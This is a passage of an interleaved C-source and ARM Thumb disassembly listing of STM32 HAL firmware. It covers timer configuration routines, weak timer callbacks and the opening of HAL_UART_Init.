 80051ea:	46bd      	mov	sp, r7
 80051ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051f0:	4770      	bx	lr
	...

080051f4 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 80051f4:	b480      	push	{r7}
 80051f6:	b085      	sub	sp, #20
 80051f8:	af00      	add	r7, sp, #0
 80051fa:	6078      	str	r0, [r7, #4]
 80051fc:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 80051fe:	687b      	ldr	r3, [r7, #4]
 8005200:	681b      	ldr	r3, [r3, #0]
 8005202:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005204:	687b      	ldr	r3, [r7, #4]
 8005206:	4a2a      	ldr	r2, [pc, #168]	; (80052b0 <TIM_Base_SetConfig+0xbc>)
 8005208:	4293      	cmp	r3, r2
 800520a:	d003      	beq.n	8005214 <TIM_Base_SetConfig+0x20>
 800520c:	687b      	ldr	r3, [r7, #4]
 800520e:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005212:	d108      	bne.n	8005226 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005214:	68fb      	ldr	r3, [r7, #12]
 8005216:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800521a:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 800521c:	683b      	ldr	r3, [r7, #0]
 800521e:	685b      	ldr	r3, [r3, #4]
 8005220:	68fa      	ldr	r2, [r7, #12]
 8005222:	4313      	orrs	r3, r2
 8005224:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 8005226:	687b      	ldr	r3, [r7, #4]
 8005228:	4a21      	ldr	r2, [pc, #132]	; (80052b0 <TIM_Base_SetConfig+0xbc>)
 800522a:	4293      	cmp	r3, r2
 800522c:	d00b      	beq.n	8005246 <TIM_Base_SetConfig+0x52>
 800522e:	687b      	ldr	r3, [r7, #4]
 8005230:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005234:	d007      	beq.n	8005246 <TIM_Base_SetConfig+0x52>
 8005236:	687b      	ldr	r3, [r7, #4]
 8005238:	4a1e      	ldr	r2, [pc, #120]	; (80052b4 <TIM_Base_SetConfig+0xc0>)
 800523a:	4293      	cmp	r3, r2
 800523c:	d003      	beq.n	8005246 <TIM_Base_SetConfig+0x52>
 800523e:	687b      	ldr	r3, [r7, #4]
 8005240:	4a1d      	ldr	r2, [pc, #116]	; (80052b8 <TIM_Base_SetConfig+0xc4>)
 8005242:	4293      	cmp	r3, r2
 8005244:	d108      	bne.n	8005258 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 8005246:	68fb      	ldr	r3, [r7, #12]
 8005248:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 800524c:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 800524e:	683b      	ldr	r3, [r7, #0]
 8005250:	68db      	ldr	r3, [r3, #12]
 8005252:	68fa      	ldr	r2, [r7, #12]
 8005254:	4313      	orrs	r3, r2
 8005256:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 8005258:	68fb      	ldr	r3, [r7, #12]
 800525a:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 800525e:	683b      	ldr	r3, [r7, #0]
 8005260:	695b      	ldr	r3, [r3, #20]
 8005262:	4313      	orrs	r3, r2
 8005264:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005266:	687b      	ldr	r3, [r7, #4]
 8005268:	68fa      	ldr	r2, [r7, #12]
 800526a:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 800526c:	683b      	ldr	r3, [r7, #0]
 800526e:	689a      	ldr	r2, [r3, #8]
 8005270:	687b      	ldr	r3, [r7, #4]
 8005272:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 8005274:	683b      	ldr	r3, [r7, #0]
 8005276:	681a      	ldr	r2, [r3, #0]
 8005278:	687b      	ldr	r3, [r7, #4]
 800527a:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 800527c:	687b      	ldr	r3, [r7, #4]
 800527e:	4a0c      	ldr	r2, [pc, #48]	; (80052b0 <TIM_Base_SetConfig+0xbc>)
 8005280:	4293      	cmp	r3, r2
 8005282:	d007      	beq.n	8005294 <TIM_Base_SetConfig+0xa0>
 8005284:	687b      	ldr	r3, [r7, #4]
 8005286:	4a0b      	ldr	r2, [pc, #44]	; (80052b4 <TIM_Base_SetConfig+0xc0>)
 8005288:	4293      	cmp	r3, r2
 800528a:	d003      	beq.n	8005294 <TIM_Base_SetConfig+0xa0>
 800528c:	687b      	ldr	r3, [r7, #4]
 800528e:	4a0a      	ldr	r2, [pc, #40]	; (80052b8 <TIM_Base_SetConfig+0xc4>)
 8005290:	4293      	cmp	r3, r2
 8005292:	d103      	bne.n	800529c <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 8005294:	683b      	ldr	r3, [r7, #0]
 8005296:	691a      	ldr	r2, [r3, #16]
 8005298:	687b      	ldr	r3, [r7, #4]
 800529a:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 800529c:	687b      	ldr	r3, [r7, #4]
 800529e:	2201      	movs	r2, #1
 80052a0:	615a      	str	r2, [r3, #20]
}
 80052a2:	bf00      	nop
 80052a4:	3714      	adds	r7, #20
 80052a6:	46bd      	mov	sp, r7
 80052a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80052ac:	4770      	bx	lr
 80052ae:	bf00      	nop
 80052b0:	40012c00 	.word	0x40012c00
 80052b4:	40014000 	.word	0x40014000
 80052b8:	40014400 	.word	0x40014400

080052bc <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80052bc:	b480      	push	{r7}
 80052be:	b087      	sub	sp, #28
 80052c0:	af00      	add	r7, sp, #0
 80052c2:	60f8      	str	r0, [r7, #12]
 80052c4:	60b9      	str	r1, [r7, #8]
 80052c6:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 80052c8:	68fb      	ldr	r3, [r7, #12]
 80052ca:	6a1b      	ldr	r3, [r3, #32]
 80052cc:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 80052ce:	68fb      	ldr	r3, [r7, #12]
 80052d0:	6a1b      	ldr	r3, [r3, #32]
 80052d2:	f023 0201 	bic.w	r2, r3, #1
 80052d6:	68fb      	ldr	r3, [r7, #12]
 80052d8:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80052da:	68fb      	ldr	r3, [r7, #12]
 80052dc:	699b      	ldr	r3, [r3, #24]
 80052de:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 80052e0:	693b      	ldr	r3, [r7, #16]
 80052e2:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 80052e6:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 80052e8:	687b      	ldr	r3, [r7, #4]
 80052ea:	011b      	lsls	r3, r3, #4
 80052ec:	693a      	ldr	r2, [r7, #16]
 80052ee:	4313      	orrs	r3, r2
 80052f0:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 80052f2:	697b      	ldr	r3, [r7, #20]
 80052f4:	f023 030a 	bic.w	r3, r3, #10
 80052f8:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 80052fa:	697a      	ldr	r2, [r7, #20]
 80052fc:	68bb      	ldr	r3, [r7, #8]
 80052fe:	4313      	orrs	r3, r2
 8005300:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 8005302:	68fb      	ldr	r3, [r7, #12]
 8005304:	693a      	ldr	r2, [r7, #16]
 8005306:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005308:	68fb      	ldr	r3, [r7, #12]
 800530a:	697a      	ldr	r2, [r7, #20]
 800530c:	621a      	str	r2, [r3, #32]
}
 800530e:	bf00      	nop
 8005310:	371c      	adds	r7, #28
 8005312:	46bd      	mov	sp, r7
 8005314:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005318:	4770      	bx	lr

0800531a <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800531a:	b480      	push	{r7}
 800531c:	b087      	sub	sp, #28
 800531e:	af00      	add	r7, sp, #0
 8005320:	60f8      	str	r0, [r7, #12]
 8005322:	60b9      	str	r1, [r7, #8]
 8005324:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 8005326:	68fb      	ldr	r3, [r7, #12]
 8005328:	6a1b      	ldr	r3, [r3, #32]
 800532a:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 800532c:	68fb      	ldr	r3, [r7, #12]
 800532e:	6a1b      	ldr	r3, [r3, #32]
 8005330:	f023 0210 	bic.w	r2, r3, #16
 8005334:	68fb      	ldr	r3, [r7, #12]
 8005336:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005338:	68fb      	ldr	r3, [r7, #12]
 800533a:	699b      	ldr	r3, [r3, #24]
 800533c:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 800533e:	693b      	ldr	r3, [r7, #16]
 8005340:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 8005344:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 8005346:	687b      	ldr	r3, [r7, #4]
 8005348:	031b      	lsls	r3, r3, #12
 800534a:	693a      	ldr	r2, [r7, #16]
 800534c:	4313      	orrs	r3, r2
 800534e:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 8005350:	697b      	ldr	r3, [r7, #20]
 8005352:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 8005356:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 8005358:	68bb      	ldr	r3, [r7, #8]
 800535a:	011b      	lsls	r3, r3, #4
 800535c:	697a      	ldr	r2, [r7, #20]
 800535e:	4313      	orrs	r3, r2
 8005360:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 8005362:	68fb      	ldr	r3, [r7, #12]
 8005364:	693a      	ldr	r2, [r7, #16]
 8005366:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005368:	68fb      	ldr	r3, [r7, #12]
 800536a:	697a      	ldr	r2, [r7, #20]
 800536c:	621a      	str	r2, [r3, #32]
}
 800536e:	bf00      	nop
 8005370:	371c      	adds	r7, #28
 8005372:	46bd      	mov	sp, r7
 8005374:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005378:	4770      	bx	lr

0800537a <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 800537a:	b480      	push	{r7}
 800537c:	b085      	sub	sp, #20
 800537e:	af00      	add	r7, sp, #0
 8005380:	6078      	str	r0, [r7, #4]
 8005382:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 8005384:	687b      	ldr	r3, [r7, #4]
 8005386:	689b      	ldr	r3, [r3, #8]
 8005388:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 800538a:	68fb      	ldr	r3, [r7, #12]
 800538c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005390:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 8005392:	683a      	ldr	r2, [r7, #0]
 8005394:	68fb      	ldr	r3, [r7, #12]
 8005396:	4313      	orrs	r3, r2
 8005398:	f043 0307 	orr.w	r3, r3, #7
 800539c:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800539e:	687b      	ldr	r3, [r7, #4]
 80053a0:	68fa      	ldr	r2, [r7, #12]
 80053a2:	609a      	str	r2, [r3, #8]
}
 80053a4:	bf00      	nop
 80053a6:	3714      	adds	r7, #20
 80053a8:	46bd      	mov	sp, r7
 80053aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053ae:	4770      	bx	lr

080053b0 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 80053b0:	b480      	push	{r7}
 80053b2:	b087      	sub	sp, #28
 80053b4:	af00      	add	r7, sp, #0
 80053b6:	60f8      	str	r0, [r7, #12]
 80053b8:	60b9      	str	r1, [r7, #8]
 80053ba:	607a      	str	r2, [r7, #4]
 80053bc:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 80053be:	68fb      	ldr	r3, [r7, #12]
 80053c0:	689b      	ldr	r3, [r3, #8]
 80053c2:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80053c4:	697b      	ldr	r3, [r7, #20]
 80053c6:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80053ca:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 80053cc:	683b      	ldr	r3, [r7, #0]
 80053ce:	021a      	lsls	r2, r3, #8
 80053d0:	687b      	ldr	r3, [r7, #4]
 80053d2:	431a      	orrs	r2, r3
 80053d4:	68bb      	ldr	r3, [r7, #8]
 80053d6:	4313      	orrs	r3, r2
 80053d8:	697a      	ldr	r2, [r7, #20]
 80053da:	4313      	orrs	r3, r2
 80053dc:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 80053de:	68fb      	ldr	r3, [r7, #12]
 80053e0:	697a      	ldr	r2, [r7, #20]
 80053e2:	609a      	str	r2, [r3, #8]
}
 80053e4:	bf00      	nop
 80053e6:	371c      	adds	r7, #28
 80053e8:	46bd      	mov	sp, r7
 80053ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053ee:	4770      	bx	lr

080053f0 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 80053f0:	b480      	push	{r7}
 80053f2:	b085      	sub	sp, #20
 80053f4:	af00      	add	r7, sp, #0
 80053f6:	6078      	str	r0, [r7, #4]
 80053f8:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 80053fa:	687b      	ldr	r3, [r7, #4]
 80053fc:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005400:	2b01      	cmp	r3, #1
 8005402:	d101      	bne.n	8005408 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 8005404:	2302      	movs	r3, #2
 8005406:	e04f      	b.n	80054a8 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 8005408:	687b      	ldr	r3, [r7, #4]
 800540a:	2201      	movs	r2, #1
 800540c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 8005410:	687b      	ldr	r3, [r7, #4]
 8005412:	2202      	movs	r2, #2
 8005414:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005418:	687b      	ldr	r3, [r7, #4]
 800541a:	681b      	ldr	r3, [r3, #0]
 800541c:	685b      	ldr	r3, [r3, #4]
 800541e:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005420:	687b      	ldr	r3, [r7, #4]
 8005422:	681b      	ldr	r3, [r3, #0]
 8005424:	689b      	ldr	r3, [r3, #8]
 8005426:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
 8005428:	687b      	ldr	r3, [r7, #4]
 800542a:	681b      	ldr	r3, [r3, #0]
 800542c:	4a21      	ldr	r2, [pc, #132]	; (80054b4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 800542e:	4293      	cmp	r3, r2
 8005430:	d108      	bne.n	8005444 <HAL_TIMEx_MasterConfigSynchronization+0x54>
  {
    /* Check the parameters */
    assert_param(IS_TIM_TRGO2_SOURCE(sMasterConfig->MasterOutputTrigger2));

    /* Clear the MMS2 bits */
    tmpcr2 &= ~TIM_CR2_MMS2;
 8005432:	68fb      	ldr	r3, [r7, #12]
 8005434:	f423 0370 	bic.w	r3, r3, #15728640	; 0xf00000
 8005438:	60fb      	str	r3, [r7, #12]
    /* Select the TRGO2 source*/
    tmpcr2 |= sMasterConfig->MasterOutputTrigger2;
 800543a:	683b      	ldr	r3, [r7, #0]
 800543c:	685b      	ldr	r3, [r3, #4]
 800543e:	68fa      	ldr	r2, [r7, #12]
 8005440:	4313      	orrs	r3, r2
 8005442:	60fb      	str	r3, [r7, #12]
  }

  /* Reset the MMS Bits */
  tmpcr2 &= ~TIM_CR2_MMS;
 8005444:	68fb      	ldr	r3, [r7, #12]
 8005446:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800544a:	60fb      	str	r3, [r7, #12]
  /* Select the TRGO source */
  tmpcr2 |=  sMasterConfig->MasterOutputTrigger;
 800544c:	683b      	ldr	r3, [r7, #0]
 800544e:	681b      	ldr	r3, [r3, #0]
 8005450:	68fa      	ldr	r2, [r7, #12]
 8005452:	4313      	orrs	r3, r2
 8005454:	60fb      	str	r3, [r7, #12]

  /* Update TIMx CR2 */
  htim->Instance->CR2 = tmpcr2;
 8005456:	687b      	ldr	r3, [r7, #4]
 8005458:	681b      	ldr	r3, [r3, #0]
 800545a:	68fa      	ldr	r2, [r7, #12]
 800545c:	605a      	str	r2, [r3, #4]

  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 800545e:	687b      	ldr	r3, [r7, #4]
 8005460:	681b      	ldr	r3, [r3, #0]
 8005462:	4a14      	ldr	r2, [pc, #80]	; (80054b4 <HAL_TIMEx_MasterConfigSynchronization+0xc4>)
 8005464:	4293      	cmp	r3, r2
 8005466:	d009      	beq.n	800547c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005468:	687b      	ldr	r3, [r7, #4]
 800546a:	681b      	ldr	r3, [r3, #0]
 800546c:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005470:	d004      	beq.n	800547c <HAL_TIMEx_MasterConfigSynchronization+0x8c>
 8005472:	687b      	ldr	r3, [r7, #4]
 8005474:	681b      	ldr	r3, [r3, #0]
 8005476:	4a10      	ldr	r2, [pc, #64]	; (80054b8 <HAL_TIMEx_MasterConfigSynchronization+0xc8>)
 8005478:	4293      	cmp	r3, r2
 800547a:	d10c      	bne.n	8005496 <HAL_TIMEx_MasterConfigSynchronization+0xa6>
  {
    /* Reset the MSM Bit */
    tmpsmcr &= ~TIM_SMCR_MSM;
 800547c:	68bb      	ldr	r3, [r7, #8]
 800547e:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005482:	60bb      	str	r3, [r7, #8]
    /* Set master mode */
    tmpsmcr |= sMasterConfig->MasterSlaveMode;
 8005484:	683b      	ldr	r3, [r7, #0]
 8005486:	689b      	ldr	r3, [r3, #8]
 8005488:	68ba      	ldr	r2, [r7, #8]
 800548a:	4313      	orrs	r3, r2
 800548c:	60bb      	str	r3, [r7, #8]

    /* Update TIMx SMCR */
    htim->Instance->SMCR = tmpsmcr;
 800548e:	687b      	ldr	r3, [r7, #4]
 8005490:	681b      	ldr	r3, [r3, #0]
 8005492:	68ba      	ldr	r2, [r7, #8]
 8005494:	609a      	str	r2, [r3, #8]
  }

  /* Change the htim state */
  htim->State = HAL_TIM_STATE_READY;
 8005496:	687b      	ldr	r3, [r7, #4]
 8005498:	2201      	movs	r2, #1
 800549a:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800549e:	687b      	ldr	r3, [r7, #4]
 80054a0:	2200      	movs	r2, #0
 80054a2:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return HAL_OK;
 80054a6:	2300      	movs	r3, #0
}
 80054a8:	4618      	mov	r0, r3
 80054aa:	3714      	adds	r7, #20
 80054ac:	46bd      	mov	sp, r7
 80054ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054b2:	4770      	bx	lr
 80054b4:	40012c00 	.word	0x40012c00
 80054b8:	40014000 	.word	0x40014000

080054bc <HAL_TIMEx_CommutCallback>:
  * @brief  Hall commutation changed callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_CommutCallback(TIM_HandleTypeDef *htim)
{
 80054bc:	b480      	push	{r7}
 80054be:	b083      	sub	sp, #12
 80054c0:	af00      	add	r7, sp, #0
 80054c2:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_CommutCallback could be implemented in the user file
   */
}
 80054c4:	bf00      	nop
 80054c6:	370c      	adds	r7, #12
 80054c8:	46bd      	mov	sp, r7
 80054ca:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054ce:	4770      	bx	lr

080054d0 <HAL_TIMEx_BreakCallback>:
  * @brief  Hall Break detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_BreakCallback(TIM_HandleTypeDef *htim)
{
 80054d0:	b480      	push	{r7}
 80054d2:	b083      	sub	sp, #12
 80054d4:	af00      	add	r7, sp, #0
 80054d6:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIMEx_BreakCallback could be implemented in the user file
   */
}
 80054d8:	bf00      	nop
 80054da:	370c      	adds	r7, #12
 80054dc:	46bd      	mov	sp, r7
 80054de:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054e2:	4770      	bx	lr

080054e4 <HAL_TIMEx_Break2Callback>:
  * @brief  Hall Break2 detection callback in non blocking mode
  * @param  htim: TIM handle
  * @retval None
  */
__weak void HAL_TIMEx_Break2Callback(TIM_HandleTypeDef *htim)
{
 80054e4:	b480      	push	{r7}
 80054e6:	b083      	sub	sp, #12
 80054e8:	af00      	add	r7, sp, #0
 80054ea:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function Should not be modified, when the callback is needed,
            the HAL_TIMEx_Break2Callback could be implemented in the user file
   */
}
 80054ec:	bf00      	nop
 80054ee:	370c      	adds	r7, #12
 80054f0:	46bd      	mov	sp, r7
 80054f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054f6:	4770      	bx	lr

080054f8 <HAL_UART_Init>:
  *        parameters in the UART_InitTypeDef and initialize the associated handle.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_UART_Init(UART_HandleTypeDef *huart)
{
 80054f8:	b580      	push	{r7, lr}
 80054fa:	b082      	sub	sp, #8
 80054fc:	af00      	add	r7, sp, #0
 80054fe:	6078      	str	r0, [r7, #4]
  /* Check the UART handle allocation */
  if (huart == NULL)
 8005500:	687b      	ldr	r3, [r7, #4]
 8005502:	2b00      	cmp	r3, #0
 8005504:	d101      	bne.n	800550a <HAL_UART_Init+0x12>
  {
    return HAL_ERROR;
 8005506:	2301      	movs	r3, #1
 8005508:	e040      	b.n	800558c <HAL_UART_Init+0x94>
  {
    /* Check the parameters */
    assert_param((IS_UART_INSTANCE(huart->Instance)) || (IS_LPUART_INSTANCE(huart->Instance)));
  }

  if (huart->gState == HAL_UART_STATE_RESET)
 800550a:	687b      	ldr	r3, [r7, #4]
 800550c:	6fdb      	ldr	r3, [r3, #124]	; 0x7c
 800550e:	2b00      	cmp	r3, #0
 8005510:	d106      	bne.n	8005520 <HAL_UART_Init+0x28>
  {
    /* Allocate lock resource and initialize it */
    huart->Lock = HAL_UNLOCKED;
 8005512:	687b      	ldr	r3, [r7, #4]
 8005514:	2200      	movs	r2, #0
 8005516:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

    /* Init the low level hardware */
    huart->MspInitCallback(huart);
#else
    /* Init the low level hardware : GPIO, CLOCK */
    HAL_UART_MspInit(huart);
 800551a:	6878      	ldr	r0, [r7, #4]
 800551c:	f7fb fd78 	bl	8001010 <HAL_UART_MspInit>
#endif /* (USE_HAL_UART_REGISTER_CALLBACKS) */
  }

  huart->gState = HAL_UART_STATE_BUSY;
 8005520:	687b      	ldr	r3, [r7, #4]
 8005522:	2224      	movs	r2, #36	; 0x24
 8005524:	67da      	str	r2, [r3, #124]	; 0x7c

  __HAL_UART_DISABLE(huart);
 8005526:	687b      	ldr	r3, [r7, #4]
 8005528:	681b      	ldr	r3, [r3, #0]
 800552a:	681a      	ldr	r2, [r3, #0]
 800552c:	687b      	ldr	r3, [r7, #4]
 800552e:	681b      	ldr	r3, [r3, #0]
 8005530:	f022 0201 	bic.w	r2, r2, #1
 8005534:	601a      	str	r2, [r3, #0]

  /* Perform advanced settings configuration */
  /* For some items, configuration requires to be done prior TE and RE bits are set */
  if (huart->AdvancedInit.AdvFeatureInit != UART_ADVFEATURE_NO_INIT)
 8005536:	687b      	ldr	r3, [r7, #4]
 8005538:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800553a:	2b00      	cmp	r3, #0
 800553c:	d002      	beq.n	8005544 <HAL_UART_Init+0x4c>
  {
    UART_AdvFeatureConfig(huart);
 800553e:	6878      	ldr	r0, [r7, #4]
 8005540:	f000 fa54 	bl	80059ec <UART_AdvFeatureConfig>
  }

  /* Set the UART Communication parameters */
  if (UART_SetConfig(huart) == HAL_ERROR)
 8005544:	6878      	ldr	r0, [r7, #4]
 8005546:	f000 f825 	bl	8005594 <UART_SetConfig>
 800554a:	4603      	mov	r3, r0
 800554c:	2b01      	cmp	r3, #1
 800554e:	d101      	bne.n	8005554 <HAL_UART_Init+0x5c>
  {
    return HAL_ERROR;
 8005550:	2301      	movs	r3, #1
 8005552:	e01b      	b.n	800558c <HAL_UART_Init+0x94>
  }

  /* In asynchronous mode, the following bits must be kept cleared:
  - LINEN and CLKEN bits in the USART_CR2 register,
  - SCEN, HDSEL and IREN  bits in the USART_CR3 register.*/
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8005554:	687b      	ldr	r3, [r7, #4]
 8005556:	681b      	ldr	r3, [r3, #0]
 8005558:	685a      	ldr	r2, [r3, #4]
 800555a:	687b      	ldr	r3, [r7, #4]
 800555c:	681b      	ldr	r3, [r3, #0]
 800555e:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 8005562:	605a      	str	r2, [r3, #4]
